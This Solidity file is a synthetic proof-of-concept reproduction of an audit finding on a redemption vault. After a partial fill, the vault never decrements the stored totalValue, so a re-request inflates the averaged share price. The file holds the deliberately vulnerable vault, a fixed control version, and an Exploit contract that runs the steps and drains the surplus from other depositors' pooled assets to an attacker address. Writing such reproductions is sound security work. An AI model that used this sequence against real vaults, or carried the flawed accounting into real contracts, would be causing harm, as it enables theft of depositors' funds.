// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Accountable finding 62971:
// "Partial redemptions can be used to steal assets" (Cyfrin).
//
// AccountableAsyncRedeemVault queues share-redemption requests. When
// processingMode == RequestPrice, every request stores {shares, totalValue,
// sharePrice}, and re-requesting onto an EXISTING requestId recomputes an
// AVERAGED sharePrice from request.totalValue (verbatim else-branch below).
//
// The bug: _reduce() (verbatim below) decrements request.shares on a PARTIAL
// fill but NEVER decrements request.totalValue. A controller whose request is
// partially filled and then re-requests therefore averages the new shares
// against a STALE, inflated totalValue — inflating request.sharePrice and thus
// the assets credited to maxWithdraw. The controller is credited ~500 base
// assets for 200 shares truly worth 400 (price 2), and drains the ~100 surplus
// from the pooled vault assets belonging to other depositors.
//
// Scenario (from the finding, exact):
//   request 100 @ price 2   -> {shares:100, totalValue:200, sharePrice:2}
//   partial-fill 50         -> credited 100 assets; {shares:50, totalValue:200}  (totalValue NOT decremented)
//   re-request 100 @ price 2-> {shares:150, totalValue:400, sharePrice:2.666...}
//   full-fill 150           -> credited ~400 assets; total credited ~500 > fair 400
// Negative control: a fixed _reduce() that also decrements totalValue credits
// exactly 400 (== fair), so nothing is stolen.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Minimal faithful double for OpenZeppelin's Math.mulDiv (floor division).
library Math {
    function mulDiv(uint256 a, uint256 b, uint256 c) internal pure returns (uint256) {
        return a * b / c;
    }
}

/// @dev Minimal ERC20 double for the vault's pooled base asset. Not the
///      vulnerable boundary — it is the opaque token the vault custodies.
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

enum ProcessingMode {
    VaultPrice,
    RequestPrice
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE vault. The averaging else-branch and _reduce() are inlined
// VERBATIM from the finding; the new-request branch and asset-crediting line
// are the trivially-reconstructed surrounding scaffold.
// ─────────────────────────────────────────────────────────────────────────────
contract AccountableAsyncRedeemVault {
    using Math for uint256;

    struct WithdrawalRequest {
        uint256 shares;
        uint256 totalValue;
        uint256 sharePrice;
    }

    struct Queue {
        uint128 nextRequestId;
        mapping(uint128 => WithdrawalRequest) requests;
    }

    error NoQueueRequest();
    error InsufficientShares();

    uint256 internal immutable _precision;
    ProcessingMode public processingMode;
    MiniToken public asset;

    Queue internal _queue;
    mapping(address => uint128) internal _requestIds;
    uint256 public totalQueuedShares;

    // Assets a controller may withdraw once its request(s) are fulfilled.
    mapping(address => uint256) public maxWithdraw;

    constructor(address asset_, uint256 precision_, ProcessingMode mode_) {
        asset = MiniToken(asset_);
        _precision = precision_;
        processingMode = mode_;
        _queue.nextRequestId = 1;
    }

    /// @notice Push a redeem request for `shares` at `sharePrice` for `controller`.
    ///         New-request branch is reconstructed scaffold; the else-branch
    ///         (existing requestId) is the VERBATIM vulnerable averaging code.
    function requestRedeem(address controller, uint256 shares, uint256 sharePrice) external returns (uint128 requestId) {
        uint128 requestId_ = _requestIds[controller];

        if (requestId_ == 0) { // new request for this controller (reconstructed)
            requestId = _queue.nextRequestId++;
            _requestIds[controller] = requestId;

            WithdrawalRequest storage request = _queue.requests[requestId];
            request.shares = shares;
            if (processingMode == ProcessingMode.RequestPrice) {
                request.totalValue = shares.mulDiv(sharePrice, _precision);
                request.sharePrice = sharePrice;
            }
            totalQueuedShares += shares;
        } else { // if controller had an existing active requestID
            requestId = requestId_;

            WithdrawalRequest storage request = _queue.requests[requestId_];

            request.shares += shares;

            if (processingMode == ProcessingMode.RequestPrice) {
                request.totalValue += shares.mulDiv(sharePrice, _precision);
                request.sharePrice = request.totalValue.mulDiv(_precision, request.shares); // the average sharePrice is being calculated here.
            } // the whole request will have a single price, averaged recursively as new redeem requests come up.

            totalQueuedShares += shares;
        }
    }

    /// @notice Fulfill `shares` of a controller's request. Credits assets
    ///         (shares * request.sharePrice / precision) to maxWithdraw, then
    ///         reduces the request (reconstructed scaffold around _reduce).
    function fulfillRedeemRequest(address controller, uint256 shares) external {
        uint128 requestId = _requestIds[controller];
        if (requestId == 0) revert NoQueueRequest();

        uint256 sharePrice = _queue.requests[requestId].sharePrice;
        uint256 assets = shares.mulDiv(sharePrice, _precision);
        maxWithdraw[controller] += assets;

        _reduce(controller, shares);
    }

    /// @dev VERBATIM vulnerable function from the finding. On a partial fill the
    ///      request's totalValue is never decremented, so a later re-request
    ///      averages against a stale, inflated totalValue.
    function _reduce(address controller, uint256 shares) internal returns (uint256 remainingShares) {
        uint128 requestId = _requestIds[controller];
        if (requestId == 0) revert NoQueueRequest();

        uint256 currentShares = _queue.requests[requestId].shares;
        if (shares > currentShares || currentShares == 0) revert InsufficientShares();

        remainingShares = currentShares - shares;
        totalQueuedShares -= shares;

        if (remainingShares == 0) {
            _delete(controller, requestId);
        } else {
            _queue.requests[requestId].shares = remainingShares; // @> totalValue is NOT decremented here — it stays inflated after a partial fill
        } // @audit the totalValue is not updated here.
    }

    function _delete(address controller, uint128 requestId) internal {
        delete _queue.requests[requestId];
        delete _requestIds[controller];
    }

    /// @notice Withdraw fulfilled assets, capped by the (inflated) maxWithdraw.
    function withdraw(address to, uint256 amount) external {
        require(amount <= maxWithdraw[msg.sender], "exceeds maxWithdraw");
        maxWithdraw[msg.sender] -= amount;
        asset.transfer(to, amount);
    }

    function requestOf(address controller) external view returns (uint256 shares, uint256 totalValue, uint256 sharePrice) {
        uint128 id = _requestIds[controller];
        WithdrawalRequest storage r = _queue.requests[id];
        return (r.shares, r.totalValue, r.sharePrice);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED vault (negative control): _reduce() also decrements request.totalValue
// by the redeemed assets, per the finding's recommended mitigation.
// ─────────────────────────────────────────────────────────────────────────────
contract AccountableAsyncRedeemVaultFixed {
    using Math for uint256;

    struct WithdrawalRequest {
        uint256 shares;
        uint256 totalValue;
        uint256 sharePrice;
    }

    struct Queue {
        uint128 nextRequestId;
        mapping(uint128 => WithdrawalRequest) requests;
    }

    error NoQueueRequest();
    error InsufficientShares();

    uint256 internal immutable _precision;
    ProcessingMode public processingMode;
    MiniToken public asset;

    Queue internal _queue;
    mapping(address => uint128) internal _requestIds;
    uint256 public totalQueuedShares;

    mapping(address => uint256) public maxWithdraw;

    constructor(address asset_, uint256 precision_, ProcessingMode mode_) {
        asset = MiniToken(asset_);
        _precision = precision_;
        processingMode = mode_;
        _queue.nextRequestId = 1;
    }

    function requestRedeem(address controller, uint256 shares, uint256 sharePrice) external returns (uint128 requestId) {
        uint128 requestId_ = _requestIds[controller];

        if (requestId_ == 0) {
            requestId = _queue.nextRequestId++;
            _requestIds[controller] = requestId;

            WithdrawalRequest storage request = _queue.requests[requestId];
            request.shares = shares;
            if (processingMode == ProcessingMode.RequestPrice) {
                request.totalValue = shares.mulDiv(sharePrice, _precision);
                request.sharePrice = sharePrice;
            }
            totalQueuedShares += shares;
        } else {
            requestId = requestId_;

            WithdrawalRequest storage request = _queue.requests[requestId_];

            request.shares += shares;

            if (processingMode == ProcessingMode.RequestPrice) {
                request.totalValue += shares.mulDiv(sharePrice, _precision);
                request.sharePrice = request.totalValue.mulDiv(_precision, request.shares);
            }

            totalQueuedShares += shares;
        }
    }

    function fulfillRedeemRequest(address controller, uint256 shares) external {
        uint128 requestId = _requestIds[controller];
        if (requestId == 0) revert NoQueueRequest();

        uint256 sharePrice = _queue.requests[requestId].sharePrice;
        uint256 assets = shares.mulDiv(sharePrice, _precision);
        maxWithdraw[controller] += assets;

        _reduce(controller, shares);
    }

    function _reduce(address controller, uint256 shares) internal returns (uint256 remainingShares) {
        uint128 requestId = _requestIds[controller];
        if (requestId == 0) revert NoQueueRequest();

        uint256 currentShares = _queue.requests[requestId].shares;
        if (shares > currentShares || currentShares == 0) revert InsufficientShares();

        remainingShares = currentShares - shares;
        totalQueuedShares -= shares;

        if (remainingShares == 0) {
            _delete(controller, requestId);
        } else {
            // FIX: decrement the redeemed assets from totalValue too, keeping
            // the averaged sharePrice honest on any later re-request.
            uint256 sharePrice = _queue.requests[requestId].sharePrice;
            _queue.requests[requestId].totalValue -= shares.mulDiv(sharePrice, _precision);
            _queue.requests[requestId].shares = remainingShares;
        }
    }

    function _delete(address controller, uint128 requestId) internal {
        delete _queue.requests[requestId];
        delete _requestIds[controller];
    }

    function withdraw(address to, uint256 amount) external {
        require(amount <= maxWithdraw[msg.sender], "exceeds maxWithdraw");
        maxWithdraw[msg.sender] -= amount;
        asset.transfer(to, amount);
    }

    function requestOf(address controller) external view returns (uint256 shares, uint256 totalValue, uint256 sharePrice) {
        uint128 id = _requestIds[controller];
        WithdrawalRequest storage r = _queue.requests[id];
        return (r.shares, r.totalValue, r.sharePrice);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: run() executes the real buggy redemption sequence against the
// verbatim vulnerable vault, then drains the surplus base assets (credited over
// fair value) to the attacker EOA. The pooled assets it steals belong to other
// depositors custodied by the vault.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    using Math for uint256;

    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    uint256 internal constant PRECISION = 1e18;
    uint256 internal constant PRICE = 2 * 1e18; // true share price = 2 (scaled)
    uint256 internal constant SHARES = 100 ether; // request size (scaled)
    uint256 internal constant PARTIAL = 50 ether; // partial fill size
    uint256 internal constant POOL = 1_000_000 ether; // other depositors' pooled assets

    // This contract is the attacker-controlled redemption controller; maxWithdraw
    // is credited to it, so it (msg.sender) can withdraw the inflated entitlement.
    address internal controller;

    // Exposed results for the driver.
    uint256 public buggyCredited; // maxWithdraw credited via the buggy path (~500)
    uint256 public fairCredited; // fair entitlement (200 shares * price 2 == 400)
    uint256 public stolenAssets; // surplus drained to the attacker (~100)
    uint256 public vaultBefore;
    uint256 public vaultAfter;
    uint256 public attackerBalance;
    address public vaultAddr;
    address public assetAddr;

    function run() external payable {
        controller = address(this);

        // --- deploy the base asset, the vault, then seed the pool (fixed order) ---
        MiniToken asset = new MiniToken("Stolen Base Asset", "STOLEN-ASSET"); // nonce 1
        AccountableAsyncRedeemVault vault =
            new AccountableAsyncRedeemVault(address(asset), PRECISION, ProcessingMode.RequestPrice); // nonce 2

        vaultAddr = address(vault);
        assetAddr = address(asset);

        // Other depositors' assets pooled in the vault.
        asset.mint(address(vault), POOL);
        vaultBefore = asset.balanceOf(address(vault));

        // --- 1) request 100 shares @ price 2 -> {shares:100, totalValue:200, sharePrice:2} ---
        vault.requestRedeem(controller, SHARES, PRICE);

        // --- 2) partial fill 50: credits 100 assets; totalValue NOT decremented ---
        vault.fulfillRedeemRequest(controller, PARTIAL);

        // --- 3) re-request 100 @ price 2 onto the SAME requestId (else-branch averaging) ---
        //     shares 50->150, totalValue 200->400, sharePrice -> 400*prec/150 == 2.666...
        vault.requestRedeem(controller, SHARES, PRICE);

        // --- 4) full fill remaining 150 at the inflated averaged price ---
        (uint256 remShares,,) = vault.requestOf(controller);
        vault.fulfillRedeemRequest(controller, remShares);

        buggyCredited = vault.maxWithdraw(controller);

        // Fair entitlement: total redeemed shares (50 + 150 == 200) at true price 2.
        uint256 totalRedeemed = PARTIAL + remShares; // 200
        fairCredited = totalRedeemed.mulDiv(PRICE, PRECISION); // 400

        // --- harm: the controller drains the surplus (credited over fair) from the
        //     pool to the attacker EOA. Those assets belong to other depositors. ---
        stolenAssets = buggyCredited - fairCredited; // ~100
        vault.withdraw(ATTACKER, stolenAssets); // msg.sender == controller == this

        vaultAfter = asset.balanceOf(address(vault));
        attackerBalance = asset.balanceOf(ATTACKER);

        require(buggyCredited > fairCredited, "no over-credit");
        require(attackerBalance == stolenAssets, "attacker did not receive stolen surplus");
        require(vaultBefore - vaultAfter == stolenAssets, "vault pool not drained by surplus");
    }
}
